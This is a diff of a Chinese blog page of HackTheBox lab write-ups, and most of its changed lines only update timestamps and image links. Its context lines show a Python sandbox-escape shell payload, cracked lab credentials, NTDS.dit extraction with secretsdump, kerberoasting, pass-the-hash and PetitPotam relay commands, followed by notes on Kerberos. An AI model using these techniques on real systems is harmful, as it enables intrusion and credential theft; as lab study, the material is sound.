@@ -29,7 +29,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/images/sauy.jpg">
 <meta property="article:published_time" content="2100-01-22T09:20:58.000Z">
-<meta property="article:modified_time" content="2026-03-18T14:38:51.781Z">
+<meta property="article:modified_time" content="2026-03-19T12:06:29.237Z">
 <meta property="article:author" content="Sauy">
 <meta property="article:tag" content="渗透学习">
 <meta name="twitter:card" content="summary_large_image">
@@ -49,7 +49,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2100-01-22T17:20:58+08:00","dateModified":"2026-03-18T22:38:51+08:00","datePublished":"2100-01-22T17:20:58+08:00","description":"","headline":"渗透靶机-wp-长期更新","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2100/01/22/HTB-Practice/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2100/01/22/HTB-Practice/","keywords":"渗透学习","thumbnailUrl":"/images/11.JPG","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2100-01-22T17:20:58+08:00","dateModified":"2026-03-19T20:06:29+08:00","datePublished":"2100-01-22T17:20:58+08:00","description":"","headline":"渗透靶机-wp-长期更新","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2100/01/22/HTB-Practice/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2100/01/22/HTB-Practice/","keywords":"渗透学习","thumbnailUrl":"/images/11.JPG","image":1}</script>
   
 </head>
 <body>
@@ -81,7 +81,7 @@
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
 <span class="sep"></span><a class="cap breadcrumb" href="/">文章</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2100-01-22T09:20:58.000Z">2100-01-22</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-03-18T14:38:51.781Z">2026-03-18</time></span></div></div></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2100-01-22T09:20:58.000Z">2100-01-22</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-03-19T12:06:29.237Z">2026-03-19</time></span></div></div></div>
     
     <div class="bottom only-title">
       
@@ -102,7 +102,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">317</span>](<span class="string">&#x27;ls *&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip())</span><br><span class="line"><span class="comment">#b&#x27;app.pyinstance:\ndatabase.db\n\n__pycache__:\napp.cpython-38.pyc\n\nstatic:\ncss\n\ntemplates:\nabout.html\ncodes.html\nindex.html\nlogin.html\nregister.html&#x27; </span></span><br><span class="line">发现有instance下有database.db 读一下试试看</span><br></pre></td></tr></table></figure>
 
 <p>于是可以拿到 martin的hash加密后的密码  <code>3de6f30c4a09c27fc71932bfc68474be</code> 就是 <code>nafeelswordsmaster</code></p>
-<p>然后使用ssh登录 ssh <a href="mailto:&#109;&#97;&#114;&#116;&#105;&#x6e;&#x40;&#x31;&#x30;&#x2e;&#x31;&#x30;&#46;&#x31;&#x31;&#46;&#x36;&#x32;">martin@10.10.11.62</a> 提示输入密码 输入就好了</p>
+<p>然后使用ssh登录 ssh <a href="mailto:&#109;&#x61;&#x72;&#x74;&#105;&#x6e;&#64;&#49;&#48;&#46;&#x31;&#48;&#x2e;&#49;&#x31;&#x2e;&#x36;&#x32;">martin@10.10.11.62</a> 提示输入密码 输入就好了</p>
 <p>输入<code>sudo -l</code> 回显 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">martin@code:~$ sudo -l</span><br><span class="line">Matching Defaults entries for martin on localhost:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User martin may run the following commands on localhost:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh</span><br></pre></td></tr></table></figure>
 
@@ -219,7 +219,7 @@
 <p>访问web界面 发现是Colorlib 这个是wordpress的一个插件 本来我以为考的是wp的漏洞 搜寻和使用wpscan扫了一下 没有什么发现</p>
 <p>看网站吧 </p>
 <p>他有一个下载功能 可以下载流量包 流量包下载是有编号的 现在就考察平常的渗透能力 发现&#x2F;data&#x2F;<id>下载的是对应编号的流量包 那么我们尝试&#x2F;data&#x2F;0 果然下载下来一个流量包 查看发现 http和ftp流量 刚好前面对应开了ftp的21端口</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260104144707174.png" alt="image-20260104144707174"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe65778023.webp" alt="image-20260104144707174.png"></p>
 <p>可以得到帐号和密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nathan</span><br><span class="line">Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure>
 
@@ -264,7 +264,7 @@
 
 <p>可以提升权限</p>
 <p>在setting发现aws相关凭证</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260218205548787.png" alt="image-20260218205548787"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe63c29d42.webp" alt="image-20260218205548787.png"></p>
 <p>使用awscli连接</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure</span><br></pre></td></tr></table></figure>
 
@@ -385,7 +385,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">robocopy /b E:\Windows\NTDS . ntds.dit</span><br></pre></td></tr></table></figure>
 
 <p>然后dir 看到了我们想要的文件 直接下载即可</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260313211453742.png" alt="image-20260313211453742"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe613863fb.webp" alt="image-20260313211453742.png"></p>
 <p>拿到文件后开始解密</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -ntds ntds.dit -system system LOCAL</span><br></pre></td></tr></table></figure>
 
@@ -463,7 +463,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.129.234.69/NETLOGON -U &#x27;guest%&#x27;</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Sat Aug 26 20:45:24 2023</span><br><span class="line">  ..                                  D        0  Sat Aug 26 17:45:45 2023</span><br><span class="line">  users.bat                           A      159  Sat Aug 26 20:54:29 2023</span><br><span class="line"></span><br><span class="line">                4652287 blocks of size 4096. 1165832 blocks available</span><br><span class="line">smb: \&gt; get users.bat     </span><br></pre></td></tr></table></figure>
 
 <p>发现users.bat里给了重要的Administrator用户的密码 但是似乎是fileserver这台机器上的 并不是我现在这个</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260316134318570.png" alt="image-20260316134318570"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe55f74e5d.webp" alt="imge"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 10.129.234.69 -u <span class="string">&#x27;administrator&#x27;</span> -p <span class="string">&#x27;P4ssw0rd1#123&#x27;</span> <span class="comment">#失败</span></span><br></pre></td></tr></table></figure>
 
 <p>换成里面的用户名 连接成功</p>
@@ -472,7 +472,7 @@
 <p>使用bloodhound收集域内信息</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u A.Briggs -p <span class="string">&#x27;P4ssw0rd1#123&#x27;</span> -d delegate.vl -c all --zip -ns 10.129.234.69</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260316153938256.png" alt="image-20260316153938256"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe55f47256.webp" alt="image-20260316153938256"></p>
 <p>显示有GenericWrite权限</p>
 <p><img src="https://image.3001.net/images/20230707/1688740789_64a823b58c501523cd85f.png" alt="img"></p>
 <p>这里用到的攻击手法是 <strong>kerberoasting攻击</strong></p>
@@ -487,7 +487,7 @@
 <p>使用hashcat爆破明文密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 n_hash /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260316195338690.png" alt="image-20260316195338690"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe55ec561e.webp" alt="image-20260316195338690"></p>
 <p><code>KALEB_2341</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.129.229.9 -u <span class="string">&#x27;N.Thompson&#x27;</span> -p <span class="string">&#x27;KALEB_2341&#x27;</span></span><br></pre></td></tr></table></figure>
 
@@ -513,10 +513,10 @@
 <p>启动监听</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 krbrelayx.py -hashes :c5f2d015f316018f6405522825689ffe</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260316212854059.png" alt="image-20260316212854059"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe554d39a2.webp" alt="image-20260316212854059"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -target-ip 10.129.229.9 -u &#x27;pwn$&#x27; -p &#x27;P@ssword123!&#x27; pwn dc1.delegate.vl</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260316212843542.png" alt="image-20260316212843542"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe5554d7a8.webp" alt="image-20260316212843542"></p>
 <p>最后</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=DC1\<span class="variable">$@DELEGATE</span>.VL_krbtgt@DELEGATE.VL.ccache impacket-secretsdump -just-dc-user Administrator -k dc1.delegate.vl</span><br></pre></td></tr></table></figure>
 
@@ -525,13 +525,13 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.129.234.69 -u Administrator -H c32198ceab4cc695e65045562aa3ee93</span><br></pre></td></tr></table></figure>
 
 <h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>大致过程：</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260318222855551.png" alt="image-20260318222855551"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe55513881.webp" alt="image-20260318222855551"></p>
 <p><img src="https://image.3001.net/images/20230707/1688740789_64a823b58c501523cd85f.png" alt="img"></p>
 <h2 id="kerberoasting攻击"><a href="#kerberoasting攻击" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h2><h3 id="SPN（service-principal-name）服务主体名称"><a href="#SPN（service-principal-name）服务主体名称" class="headerlink" title="SPN（service principal name）服务主体名称"></a>SPN（service principal name）服务主体名称</h3><p>Windows域环境中用于标识服务或应用程序的唯一标识符，kerberos认证使用SPN来关联服务和运行的应用程序</p>
 <p>格式</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260318211348104.png" alt="image-20260318211348104"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe553b3e90.webp" alt="image-20260318211348104"></p>
 <h3 id="kerberoasting攻击-1"><a href="#kerberoasting攻击-1" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h3><p>客户端请求一个服务票据并离线破解服务账户的密码hash</p>
-<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260318215315260.png" alt="image-20260318215315260"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe554d39a2.webp" alt="image-20260318215315260"></p>
 <p>导出票据：</p>
 <p>mimikatz可以导出票据 或者使用rebeus可以直接拿到票据里的hash（前提都是你可以RDPWindows桌面这样 这两工具方便点</p>
 <p>如果只有ip用户密码 那可以使用targetedKerberoast或者impacket-GetUserSPNs 模块</p>
